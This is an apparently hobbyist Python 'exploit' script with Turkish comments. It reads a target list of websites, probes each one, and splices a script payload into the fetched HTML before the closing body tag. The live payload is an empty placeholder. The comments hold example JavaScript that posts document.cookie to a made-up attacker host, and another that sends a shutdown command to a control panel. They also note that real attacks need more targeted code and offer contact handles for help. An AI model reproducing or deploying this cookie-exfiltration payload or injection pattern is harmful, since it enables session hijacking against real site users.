import requests
from colorama import Fore
import time
import os


yasabır= '''


⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⠀⠀⠀⠀
⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⡟⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⢻⣷⣄⣀⣀⣠⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⣠⣾⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣻⣿⣿⣿⠿⠛⠛⠉⠉⠁⠀⠉⠉⠙⢻⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣾⡿⢿⣿⣇⠀⠀⠚⠀⠀⠀⠀⠀⠀⠀⣼⣿⠟⠿⣿⣿⣦⠀⠀⠀⠀
⠀⠀⣴⣿⠟⠁⠀⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡟⠀⠀⠈⣿⣿⣷⡄⠀⠀
⠀⣼⣿⠃⠀⠀⠀⠈⣿⣿⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠀⠀⠀⠀⠃⢻⣿⣿⡄⠀
⢸⣿⡇⠀⠀⠀⠀⠀⠸⣿⣇⠀⠀⠀⠀⠀⠀⣾⡿⠀⠀⠀⠀⠀⠃⠀⢻⣿⣿⡀
⣿⣿⡇⠀⠀⠀⠀⠀⠀⢹⣿⠀⠀⠀⠀⠀⣸⣿⠃⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⢿⣿⡇⠀⠀⠀⠀⠀⠀⠈⣿⡇⠀⠀⠀⢠⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣷
⠸⣿⣿⡄⠀⠀⠀⠀⠀⠀⢹⣿⠀⠀⠀⣾⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇
⠀⢻⣿⣿⣄⠀⠀⠀⠀⠀⠘⣿⡇⠀⣴⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⡟⠀
⠀⠀⠹⣿⣿⣧⡀⠀⠀⠀⠀⢿⣿⡀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⠟⠀⠀
⠀⠀⠀⠈⢿⣿⣿⣦⣀⠀⠀⢸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣤⣾⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠋⠻⢿⣿⣷⣤⣸⣿⣿⣿⣇⣀⣀⣀⣤⣶⣿⣿⣿⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⠀⠀⠀⠀⢤⠀⠙⢿⣿⣿⠟⠛⠉⢹⠁⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⠀⠀⠀⠀⠘⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀


'''

os.system('cls')
print(Fore.GREEN + yasabır)
print('''
Bu maskenin altında etten fazlası var. 
Bu maskenin altında bir fikir var, Bay Creedy. 
Ve fikirlere, kurşun işlemez.
''')
time.sleep(4)


def siteleri_tara(dosya_yolu):
    with open(dosya_yolu, 'r') as dosya:
        siteler = dosya.readlines()
        siteler = [site.strip() for site in siteler]

    for site in siteler:
        url = site.strip()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'} #user agent
        try:
            yanit = requests.get(url, headers=headers, allow_redirects=False)
            if yanit.status_code == 200:
                print(f"{url} Bağlandı.")
            else:
                print(f"{url} Bağlanamadı. Durum kodu: {yanit.status_code}")
        except requests.exceptions.RequestException as hata:
            print(f"{url} taranırken bir hata oluştu: {hata}")

    
    exploit_kodu = '''<script>
                        // Exploit kodu buraya
                     </script>'''
    
    
    
    # ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! 

    #   <script>
    #       var xhr = new XMLHttpRequest();
    #       xhr.open("POST", "http://birgunyoldabirberkegordum.doblo/collect-data", true);
    #       xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    #       xhr.send(JSON.stringify({
    #           username: "hacker123",
    #           password: "supersecret",
    #           data: document.cookie
    #       }));
    #   </script>
    #   '''
    # Üstteki örnek değişkene bir JavaScript kodu yerleştirdim. 
    # Bu kod, bir HTTP isteği göndererek, kullanıcının çerezlerini toplayan ve hacker sunucusuna ileten basit bir saldırgan senaryosunu simüle ediyor.
    # Tabii ki, gerçek bir saldırı senaryosunda, daha karmaşık ve hedefe yönelik bir kod kullanmanız gerekir.
    # Yardım için @l4ncelot @diabloakar82 'ye ulaşabilirsiniz. 

    # ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! ÖRNEKTİR! 
    # Alttaki değişkene yerleştirilen JavaScript kodu aracılığıyla bir hedef web sitesine bir GET isteği göndererek bir kontrol paneline erişmeyi simüle ediyor.
    # Burada hedef alan adına bir istek gönderiliyor ve "shutdown" komutuyla bir şutdowntan bahsediliyor.
    # exploit_kodu = '''
    # <script>
    #     const xhr = new XMLHttpRequest();
    #     xhr.open("GET", "http://w7rthyveyosefinki.com/control-panel?command=shutdown", true);
    #     xhr.send();
    # </script>
    # '''
    # Yardım için @l4ncelot @diabloakar82 'ye ulaşabilirsiniz. 


    for site in siteler:
        url = site.strip()
        try:
            yanit = requests.get(url)
            if yanit.status_code == 200:
                print(f"{url} üzerinden bilgi toplanıyor...") # Exploit kodunu yanıt içerisine yerleştir
                degistirilmis_icerik = yanit.text.replace('</body>', exploit_kodu + '</body>') # Değiştirilmiş içeriği gerekli şekilde işle
            else:
                print(f"{url} ulaşılamaz. Durum kodu: {yanit.status_code}")
        except requests.exceptions.RequestException as hata:
            print(f"{url} taranırken bir hata oluştu: {hata}")

siteleri_tara('C:\\Users\\\\Masaüstü\\noredirect\\siteler.txt') # target listesinin yolu
